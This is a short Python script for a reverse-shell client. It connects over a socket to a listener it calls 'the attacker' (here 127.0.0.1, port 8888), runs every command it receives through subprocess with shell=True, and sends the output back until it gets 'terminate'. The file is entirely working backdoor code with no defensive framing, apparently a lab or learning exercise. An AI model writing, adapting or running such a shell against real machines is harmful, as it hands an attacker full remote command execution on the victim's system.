# Importing modules required
from socket import socket
import sys
import subprocess

def connect():
    s = socket()
    print("[*] Socket Created")
    s.connect(("127.0.0.1", 8888))
    print("[*] Socket trying to connect the attacker.")
    print("[+] Socket Connected !")
    while True:
        command = s.recv(1024)
        print(command.decode())
        if 'terminate' in command.decode():
            s.close()
            print("[*] Connection Terminated !")
            break
        else:
            runCommand = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(runCommand.stdout.read())
            # s.send(runCommand.stderr.read())

def main():
    connect()

main()

